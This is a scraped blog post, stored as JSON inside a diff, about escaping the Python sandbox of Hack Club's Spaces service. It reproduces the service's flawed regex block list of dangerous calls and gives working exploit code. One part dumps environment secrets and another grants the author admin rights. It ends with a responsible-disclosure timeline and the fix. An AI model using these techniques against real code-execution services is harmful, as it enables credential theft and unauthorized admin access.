@@ -1,0 +1,102 @@
+{
+    "image_count": 2,
+    "images": [
+        "https://user-cdn.hackclub-assets.com/019c2588-6c82-7799-96db-682f923205f3/1dfad3be3d7b7bb1f31d6cd3ed986ed019439b0a_image.png",
+        "https://mahadk.com/_astro/hc-icon.DZgRWiaK_1X3xi2.svg"
+    ],
+    "video_count": 0,
+    "videos": [],
+    "link_count": 22,
+    "links": [
+        {
+            "text": "Mahad Kalam",
+            "href": "https://mahadk.com/"
+        },
+        {
+            "text": "Home",
+            "href": "https://mahadk.com/"
+        },
+        {
+            "text": "Blog",
+            "href": "https://mahadk.com/posts"
+        },
+        {
+            "text": "Projects",
+            "href": "https://mahadk.com/projects"
+        },
+        {
+            "text": "GitHub",
+            "href": "https://github.com/SkyfallWasTaken"
+        },
+        {
+            "text": "Contact",
+            "href": "https://mahadk.com/contact"
+        },
+        {
+            "text": "Hack Club",
+            "href": "https://hackclub.com/"
+        },
+        {
+            "text": "Replit",
+            "href": "https://replit.com/"
+        },
+        {
+            "text": "significant nerfing of their free plan",
+            "href": "https://www.reddit.com/r/replit/comments/1ezf9zd/huge_changes_to_free_plan/"
+        },
+        {
+            "text": "Spaces",
+            "href": "https://spaces.hackclub.com/"
+        },
+        {
+            "text": "Piston",
+            "href": "https://github.com/engineer-man/piston"
+        },
+        {
+            "text": "Isolate",
+            "href": "https://www.ucw.cz/isolate/isolate.1.html"
+        },
+        {
+            "text": "my other posts",
+            "href": "https://mahadk.com/posts"
+        },
+        {
+            "text": "Back to all blog posts",
+            "href": "https://mahadk.com/posts"
+        },
+        {
+            "text": "Subscribe on RSS",
+            "href": "https://mahadk.com/rss.xml"
+        },
+        {
+            "text": "",
+            "href": "https://github.com/SkyfallWasTaken"
+        },
+        {
+            "text": "",
+            "href": "https://x.com/skyfall_ggs"
+        },
+        {
+            "text": "Update image link for Spaces admin panel screenshot\n(8f92858)",
+            "href": "https://github.com/SkyfallWasTaken/skyfall-site/commit/8f92858"
+        },
+        {
+            "text": "512KB Club\nTeam Blue",
+            "href": "https://512kb.club/"
+        },
+        {
+            "text": "‹",
+            "href": "https://saleh.hackclub.com/"
+        },
+        {
+            "text": "",
+            "href": "https://webring.hackclub.com/"
+        },
+        {
+            "text": "›",
+            "href": "https://doruk.dino.icu/"
+        }
+    ],
+    "text_length": 8744,
+    "text_full": "Mahad Kalam\nHome /\nBlog /\nProjects /\nGitHub /\nContact\nHere’s how I got full admin rights in a Replit clone\n\nAt Hack Club, folks often want to get started coding without having a full coding environment installed on their computer (or simply can’t install one!) In the past, Replit was the main tool used, but since their significant nerfing of their free plan, it’s simply nonviable for most people who want to use it.\n\nOne of the ways Hack Club decided to tackle this was to build a version of their own called Spaces. The premise is simple — it’s just Replit but completely free. I was interested in seeing if there were any vulnerabilities I could exploit in Spaces, so I decided to play around with it and see how it works.\n\nHow it works\n\nSpaces is a Python application and had two different types of spaces:\n\nA web space, where you can create static HTML/CSS/JS sites\nA Python space, where you can write Python code and execute it (go figure)\n\nPython spaces seemed like the most promising candidate for a vulnerability, so I decided to see how it executes the code:\n\ndef run_python(site_id):\n    try:\n        site = Site.query.get_or_404(site_id)\n        data = request.get_json()\n        code = data.get('code', '')\n\n\n        import sys\n        import json\n        import re\n        from io import StringIO\n        from ast import parse, Import, ImportFrom, Call, Attribute, Name\n\n\n        with open('allowed_imports.json') as f:\n            allowed = json.load(f)['allowed_imports']\n\n\n        dangerous_patterns = [\n            r'__import__\\s*\\(', r'eval\\s*\\(', r'exec\\s*\\(', r'globals\\s*\\(',\n            r'locals\\s*\\(', r'getattr\\s*\\(', r'setattr\\s*\\(', r'delattr\\s*\\(',\n            r'compile\\s*\\(', r'open\\s*\\(', r'os\\.system\\s*\\(', r'subprocess',\n            r'count\\s*\\(', r'while\\s+True',\n            r'for\\s+.*\\s+in\\s+range\\s*\\(\\s*[0-9]{7,}\\s*\\)',\n            r'set\\s*\\(\\s*.*\\.count\\(\\s*0\\s*\\)\\s*\\)'\n        ]\n\n\n        for pattern in dangerous_patterns:\n            if re.search(pattern, code):\n                return jsonify({\n                    'output':\n                    'SecurityError: Potentially harmful operation detected',\n                    'error': True\n                }), 400\n\n\n        try:\n            tree = parse(code)\n            for node in tree.body:\n                if isinstance(node, (Import, ImportFrom)):\n                    module = node.module if isinstance(\n                        node, ImportFrom) else node.names[0].name\n                    base_module = module.split('.')[0]\n                    if base_module not in allowed:\n                        return jsonify({\n                            'output':\n                            f'ImportError: module {base_module} is not allowed. Allowed modules are: {\", \".join(allowed)}',\n                            'error': True\n                        }), 400\n\n\n                if isinstance(node, Call) and hasattr(\n                        node.func, 'id') and node.func.id in [\n                            'eval', 'exec', '__import__'\n                        ]:\n                    return jsonify({\n                        'output':\n                        'SecurityError: Potentially harmful function call detected',\n                        'error': True\n                    }),\n        except:\n           print(\"Error\") # abbreviated\n\nWait, what?\n\nSpaces was filtering based off dangerous imports, rather than using Docker or some other containment mechanism. That set off alarm bells immediately, so I decided to see which imports were allowed:\n\n{\n  \"allowed_imports\": [\n    \"math\",\n    \"random\",\n    \"datetime\",\n    \"json\",\n    \"collections\",\n    \"re\",\n    \"string\",\n    \"functools\",\n    \"time\",\n    \"statistics\",\n    \"decimal\",\n    \"fractions\",\n    \"os.path\",\n    \"sys\",\n    \"csv\"\n  ]\n}\n\nsys looked interesting, but importing it directly didn’t work (something about __import__ not being defined), so I decided to see how it was running the code itself:\n\nold_stdout = sys.stdout\nredirected_output = StringIO()\nsys.stdout = redirected_output\n\n\nimport threading\nimport builtins\nimport _thread\nclass ThreadWithException(threading.Thread):\n    def __init__(self, target=None, args=()):\n        threading.Thread.__init__(self, target=target, args=args)\n        self.exception = None\n        self.result = None\n    def run(self):\n        try:\n            if self._target:\n                self.result = self._target(*self._args)\n        except Exception as e:\n            self.exception = e\ndef execute_with_timeout(code_to_execute,\n                         restricted_globals,\n                         timeout=5):\n    def exec_target():\n        exec(code_to_execute, restricted_globals)\n    execution_thread = ThreadWithException(target=exec_target)\n    execution_thread.daemon = True\n    execution_thread.start()\n    execution_thread.join(timeout)\n    if execution_thread.is_alive():\n        _thread.interrupt_main()\n        raise TimeoutError(\n            \"Code execution timed out (maximum 5 seconds allowed)\")\n    if execution_thread.exception:\n        raise execution_thread.exception\ntry:\n    safe_builtins = {}\n    for name in dir(builtins):\n        if name not in [\n                'eval', 'exec', 'compile', '__import__', 'open',\n                'input', 'memoryview', 'globals', 'locals'\n        ]:\n            safe_builtins[name] = getattr(builtins, name)\n    restricted_globals = {'__builtins__': safe_builtins}\n    for module_name in allowed:\n        try:\n            module = __import__(module_name)\n            restricted_globals[module_name] = module\n        except ImportError:\n            pass\n    execute_with_timeout(code, restricted_globals, timeout=5)\n    output = redirected_output.getvalue()\n    if not output.strip():\n        output = \"Code executed successfully, but produced no output. Add print() statements to see results.\"\n    return jsonify({'output': output})\nexcept TimeoutError as e:\n    return jsonify({'output': str(e), 'error': True}), 400\nexcept Exception as e:\n    error_type = type(e).__name__\n  # ...\nfinally:\n    sys.stdout = old_stdout\n\n(note that both code blocks from above have had a bit of logic removed (mainly to do with error handling and things like that))\n\nSure enough, it was just running the code directly within Spaces’ Python process. I decided to see if this was exploitable by writing a bit of code to see if I could dump Spaces’ env vars:\n\ndef main():\n    os_mod = sys.modules['os']\n    env = os_mod.environ\n    print(env)\nmain()\nenviron({'GITHUB_CALLBACK_URL': '[redacted]', 'GITHUB_CLIENT_SECRET': '[redacted]', 'DATABASE_URL': '[redacted]', 'GROQ_API_KEY': 'gsk_[redacted]', 'GITHUB_CLIENT_ID': 'Ov23liPtaMsNRLw66vxr', 'SLACK_CLIENT_SECRET': '[redacted]', 'SLACK_CLIENT_ID': '2210535565.8465855857699'})\n\nBingo.\n\nThis on its own was pretty interesting - I had access to the GitHub and Slack client secrets and the Groq API key. However, the database URL was an internal one that didn’t accept connections from the wider internet, so I decided to see if I could try and get admin access to the site so I could look at things like club data. This was a bit more complex than just dumping the environment variables, but I was able to make it work:\n\napp_obj = None\n# Importing Flask wasn't allowed by the import checker,\n# and sys.modules[\"flask\"] didn't work either, so we just scan the\n# loaded modules to find the Flask class\nfor module in sys.modules.values():\n    if hasattr(module, 'app'):\n        candidate = module.app\n        if type(candidate).__name__ == 'Flask':\n            app_obj = candidate\n            break\n\n\n# `admin_utils` is an internal module that deals with admin stuff (who could've guessed :P)\nadmin_utils = sys.modules['admin_utils']\nwith app_obj.app_context():\n    admin_utils.add_admin(\"sec\")\n\n\n# We need this to be there so we don't get errors\ndef main():\n    print(\"Woah?\")\nmain()\n\nI ran the code, reloaded the page, and sure enough, I had admin access:\n\nVery nice.\n\nResponsible disclosure\n\nTo Hack Club’s credit, this was fixed surprisingly quickly. Spaces was moved off the old execution model, and now uses Piston, which uses Isolate within Docker for code execution.\n\n(these times are in British Summer Time)\n\n11/05/2025 at 1:37PM: Spaces team notified\n11/05/2025 at 1:50PM: Spaces team confirmed the issue\n20/05/2025 at 12:46PM: Spaces v2 released, which uses Piston and thus fixes this vulnerability\n\nIn other words, getting this fixed took just over a week. Nice work!\n\nThanks for making it to the end of this blog post! Check out my other posts if you’d like to see what else I’ve written :)\n\nMay 21st 2025\nBack to all blog posts\nSubscribe on RSS\n\n© 2026 Mahad Kalam.\n\nUpdate image link for Spaces admin panel screenshot\n(8f92858)\n512KB Club\nTeam Blue\n‹\n›"
+}
